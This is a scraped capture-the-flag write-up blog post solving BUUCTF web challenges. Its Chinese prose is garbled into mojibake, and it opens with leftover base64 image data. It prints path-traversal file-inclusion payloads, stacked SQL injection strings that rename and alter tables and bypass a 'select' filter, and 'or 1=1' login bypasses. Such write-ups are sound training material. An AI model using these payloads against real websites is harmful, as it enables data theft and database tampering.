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"/></svg>
<span>Travelling</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>æš—è‰²æ¨¡å¼</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">ç›®å½•</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#è§£æ³•ä¸€flask-sessionä¼ªé€ >è§£æ³•ä¸€ï¼šflask sessionä¼ªé€ </a></li><li><a href=#è§£æ³•äºŒunicodeæ¬ºéª—>è§£æ³•äºŒï¼šUnicodeæ¬ºéª—</a></li></ol><ol><li><ol><li><a href=#all-you-want-is-in-table-flag-and-the-column-is-flag>All You Want Is In Table &lsquo;flag&rsquo; and the column is &lsquo;flag&rsquo;</a></li></ol></li></ol><ol><li><a href=#éé¢„æœŸè§£>éé¢„æœŸè§£</a></li><li><a href=#é¢„æœŸè§£>é¢„æœŸè§£</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf/>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/articles/2021/01/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/>BUUCTFå¯’å‡åˆ·é¢˜-Web</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jan 18, 2021</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>é˜…è¯»æ—¶é•¿: 28 åˆ†é’Ÿ</time></div></footer></div></header><section class=article-content><p>å¯’å‡æ¨ªå‘åˆ·é¢˜ï¼ˆå°½é‡ï¼‰
<a class=link href=https://buuoj.cn/challenges# target=_blank rel=noopener>BUUCTF</a>
ğŸ’—ğŸ§¡ğŸ’›ğŸ’šğŸ’™ğŸ’œğŸ¤ğŸ–¤ğŸ¤
<strong>é¢˜éƒ½å†™è¿™ä¸€ä¸ªé‡Œé¢äº†ï¼Œå¯ä»¥å…ˆç”¨<code>Ctrl+F</code>æœç´¢ï¼Œè¿˜æœ‰éƒ¨åˆ†æ˜¯è‰ç¨¿è¿˜æ²¡æœ‰æ•´ç†ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºçš„æ€è·¯å·²ç»æ•´ç†å‡ºæ¥äº†ï¼Œçœ‹ä¸æ‡‚è¿˜è¯·å¤§ä¼™è§è°…ã€‚æœ‰é—®é¢˜äº†å¾ˆä¹æ„æ•ˆåŠ³ğŸ’¨</strong></p><h1 id=20210115>2021.01.15</h1><h1 id=hctf-2018warmup>[HCTF 2018]WarmUp</h1><p>è¿›åˆ°é¶æœºä¸€ä¸ªç¡•å¤§çš„æ»‘ç¨½ï¼ŒæŸ¥çœ‹æºç æœ‰æç¤ºsource.php</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>    highlight_file(__FILE__);
</span></span><span class=line><span class=cl>    class emmm
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        public static function checkFile(&amp;$page)
</span></span><span class=line><span class=cl>        {
</span></span><span class=line><span class=cl>            $whitelist = [&#34;source&#34;=&gt;&#34;source.php&#34;,&#34;hint&#34;=&gt;&#34;hint.php&#34;];
</span></span><span class=line><span class=cl>            if (! isset($page) || !is_string($page)) {
</span></span><span class=line><span class=cl>                echo &#34;you can&#39;t see it&#34;;
</span></span><span class=line><span class=cl>                return false;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            if (in_array($page, $whitelist)) {
</span></span><span class=line><span class=cl>                return true;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            $_page = mb_substr(
</span></span><span class=line><span class=cl>                $page,
</span></span><span class=line><span class=cl>                0,
</span></span><span class=line><span class=cl>                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
</span></span><span class=line><span class=cl>            );
</span></span><span class=line><span class=cl>            if (in_array($_page, $whitelist)) {
</span></span><span class=line><span class=cl>                return true;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            $_page = urldecode($page);
</span></span><span class=line><span class=cl>            $_page = mb_substr(
</span></span><span class=line><span class=cl>                $_page,
</span></span><span class=line><span class=cl>                0,
</span></span><span class=line><span class=cl>                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
</span></span><span class=line><span class=cl>            );
</span></span><span class=line><span class=cl>            if (in_array($_page, $whitelist)) {
</span></span><span class=line><span class=cl>                return true;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>            echo &#34;you can&#39;t see it&#34;;
</span></span><span class=line><span class=cl>            return false;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if (! empty($_REQUEST[&#39;file&#39;])
</span></span><span class=line><span class=cl>        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
</span></span><span class=line><span class=cl>        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
</span></span><span class=line><span class=cl>    ) {
</span></span><span class=line><span class=cl>        include $_REQUEST[&#39;file&#39;];
</span></span><span class=line><span class=cl>        exit;
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        echo &#34;&lt;br&gt;&lt;img src=\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&#34; /&gt;&#34;;
</span></span><span class=line><span class=cl>    }  
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>å‘ç°ç™½åå•æœ‰source.phpå’Œhint.phpï¼Œå…ˆå»æŸ¥çœ‹ä¸€ä¸‹hint.php</p><blockquote><p>flag not here, and flag in ffffllllaaaagggg</p></blockquote><p>åˆ†ææºç </p><ul><li>åˆ¤æ–­<code>$_REQUEST['file']</code>å¯¹è±¡ä¸ºç©ºä¸”ä¸ºå­—ç¬¦ä¸²</li><li>æ‰§è¡Œemmmç±»ä¸­çš„<strong>checkFile</strong>æ–¹æ³•åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•ï¼ˆç¡®ä¿å‡½æ•°è¿”å›æ˜¯trueï¼‰</li><li>æ–‡ä»¶åŒ…å«</li></ul><p>checkFileå‡½æ•°ä¸­å­—ç¬¦ä¸²æˆªå–åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•ï¼ˆä»£ç 17-24å’Œ26-34ï¼‰æ‰€ä»¥æœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ã€‚</p><ol><li>ç¬¬ä¸€ç§</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file=hint.php?../../../../../ffffllllaaaagggg
</span></span></code></pre></td></tr></table></div></div><p>å­—ç¬¦ä¸²æˆªå–å°†åŸå­—ç¬¦ä¸²å°¾éƒ¨åŠ ä¸Š<code>?</code>å†æˆªå–ç¬¬ä¸€ä¸ª<code>?</code>ä¹‹å‰çš„å†…å®¹ã€‚æ‰€ä»¥éœ€è¦åœ¨æ„é€ payloadæ—¶é—®å·å‰éœ€è¦æ˜¯ç™½åå•é‡Œçš„æ–‡ä»¶ã€‚é—®å·ä¹‹åï¼ŒçŒœæµ‹flagä½ç½®åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥ä½¿ç”¨å°½å¯èƒ½å¤šçš„<code>../</code>è¿”å›ä¸Šçº§ç›®å½•ã€‚</p><ol start=2><li>ç¬¬äºŒç§</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg
</span></span></code></pre></td></tr></table></div></div><p>å°†ç¬¬ä¸€ç§payloadä½¿ç”¨urlencodeç¼–ç å³å¯ã€‚</p><hr><h1 id=å¼ºç½‘æ¯-2019éšä¾¿æ³¨>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120094248.png loading=lazy></p><p>æ ¹æ®é¢˜ç›®å°è¯•sqlæ³¨å…¥ï¼Œå•å¼•å·æŠ¥é”™ï¼Œå•å¼•å·åŠ æ³¨é‡Šæ— æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œå½“æµ‹è¯•è¾“å…¥selectæ—¶è¿”å›è¿‡æ»¤çš„é»‘åå•ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>return preg_match(&#34;/select|update|delete|drop|insert|where|\./i&#34;,$inject);
</span></span></code></pre></td></tr></table></div></div><p>è¿™é“é¢˜ä½¿ç”¨çš„æ˜¯å †å æ³¨å…¥ï¼ŒåŸç†</p><blockquote><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p></blockquote><p>æŸ¥çœ‹æ•°æ®åº“</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;show databases;
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095211.png loading=lazy></p><p>æŸ¥çœ‹å½“å‰åº“ä¸‹çš„è¡¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;show tables;
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095339.png loading=lazy></p><p>æŸ¥çœ‹ä¸¤å¼ è¡¨å­—æ®µ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;show columns from words;
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095607.png loading=lazy></p><p>è¿˜æœ‰ä¸€ç§æŸ¥çœ‹è¡¨çš„è¯­å¥ï¼Œåœ¨windowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·ï¼ˆ`ï¼‰æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;desc `1919810931114514`;
</span></span></code></pre></td></tr></table></div></div><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095839.png loading=lazy></p><p>æ‰¾åˆ°äº†flagåœ¨çš„å­—æ®µï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è·å–è¯¥å­—æ®µçš„å€¼ã€‚é¡ºå¸¦ä¸€æï¼Œæ ¹æ®è¡¨çš„ç»“æ„ï¼Œåˆæ­¥åˆ¤æ–­é»˜è®¤æŸ¥è¯¢çš„æ˜¯<strong>word</strong>è¡¨ä¸­çš„å­—æ®µï¼Œè€Œflagåœ¨<strong>1919810931114514</strong>è¡¨ä¸­ã€‚</p><p>ç½‘ä¸Šæ‰¾åˆ°çš„ä¸¤ç§æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ä¿®æ”¹è¡¨åå’Œä½¿ç”¨é¢„å¤„ç†è¯­å¥ã€‚</p><ol><li>ä½¿ç”¨<a class=link href=https://www.cnblogs.com/geaozhang/p/9891338.html target=_blank rel=noopener>é¢„å¤„ç†</a>è¯­å¥</li></ol><p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨charå‡½æ•°ï¼Œchar() å‡½æ•°å°†selectçš„ASCIIç è½¬æ¢ä¸ºselectå­—ç¬¦ä¸²ï¼Œæ¥ç€åˆ©ç”¨concat()å‡½æ•°è¿›è¡Œæ‹¼æ¥å¾—åˆ°selectæŸ¥è¯¢è¯­å¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ã€‚æˆ–è€…ç›´æ¥ç”¨concat()å‡½æ•°æ‹¼æ¥selectæ¥ç»•è¿‡ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>char(115,101,108,101,99,116)
</span></span></code></pre></td></tr></table></div></div><p>æ ¹æ®é¢„å¤„ç†è¯­å¥æ ¼å¼æ„é€ payload</p><ul><li>åˆ›å»ºä¸€ä¸ª<strong>sqli</strong>å­—ç¬¦ä¸²å€¼ä¸ºæŸ¥è¯¢sqlè¯­å¥ï¼Œä½¿ç”¨é¢„å¤„ç†è¯­å¥èµ‹å€¼å¹¶æ‰§è¡Œã€‚</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#
</span></span></code></pre></td></tr></table></div></div><ul><li>ä¸ä½¿ç”¨å˜é‡</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;PREPARE sqli FROM CONCAT(&#39;s&#39;,&#39;elect&#39;,&#39; * from `1919810931114514`&#39;);EXECUTE sqli; #
</span></span></code></pre></td></tr></table></div></div><ul><li>è¿˜æœ‰ä¸€ç§</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;SET @sqli = CONCAT(&#39;s&#39;,&#39;e&#39;,&#39;l&#39;,&#39;e&#39;,&#39;c&#39;,&#39;t&#39;,&#39; * from `1919810931114514`&#39;);PREPARE haha FROM@sqli ;EXECUTE haha; #
</span></span></code></pre></td></tr></table></div></div><p>ä¸»è¦åŒºåˆ«åœ¨äºè¿‡æ»¤çš„ç»•è¿‡æ–¹å¼ï¼Œä¸è¦æ‹˜æ³¥äºä¸€ç§æ–¹å¼ã€‚</p><ol start=2><li>ä¿®æ”¹è¡¨å</li></ol><p>ä¿®æ”¹è¡¨åçš„æ€è·¯æ˜¯ï¼šé»˜è®¤æŸ¥è¯¢çš„æ˜¯<strong>word</strong>è¡¨ç¬¬ä¸€ä¸ªå­—æ®µï¼Œæ‰€ä»¥æŠŠ<strong>word</strong>è¡¨ä¿®æ”¹ä¸ºå…¶ä»–åç§°ï¼Œå°†flagæ‰€åœ¨çš„<strong>1919810931114514</strong>è¡¨åä¿®æ”¹ä¸º<strong>word</strong>ã€‚</p><p>ç½‘ä¸Špayload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>0</span><span class=s1>&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span>
</span></span></code></pre></td></tr></table></div></div><p>è‡ªå·±æ„é€ çš„payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>0</span><span class=s1>&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¹‹åæ‰§è¡Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; or 1=1 #
</span></span></code></pre></td></tr></table></div></div><p>æŸ¥è¯¢è¡¨æ‰€æœ‰å­—æ®µå€¼å³å¯ã€‚</p><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019easysql>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101528.png loading=lazy></p><p>ç”¨æˆ·åå¯†ç ï¼Œå°è¯•ä¸‡èƒ½å¯†ç ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;or 1=1 #
</span></span><span class=line><span class=cl>éšä¾¿å¯†ç 
</span></span></code></pre></td></tr></table></div></div><p>ä¸€ä¸ªä¸‡èƒ½å¯†ç çš„å‚è€ƒ:https://www.cnblogs.com/pass-A/p/11134988.html</p><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019havefun>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101733.png loading=lazy></p><p>ç›´æ¥æºç æ‰¾åˆ°phpä»£ç ã€‚payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?cat=dog
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=suctf-2019easysql>[SUCTF 2019]EasySQL</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120102317.png loading=lazy></p><p>å•å¼•å·æ— æŠ¥é”™ï¼Œå°è¯•å †å æ³¨å…¥å¯ä»¥å›æ˜¾ã€‚</p><p>å’Œ [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨è¿™é“é¢˜ä¸€æ ·æŸ¥åº“æŸ¥è¡¨æŸ¥å­—æ®µ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1;show databases;
</span></span><span class=line><span class=cl>1;show tables;
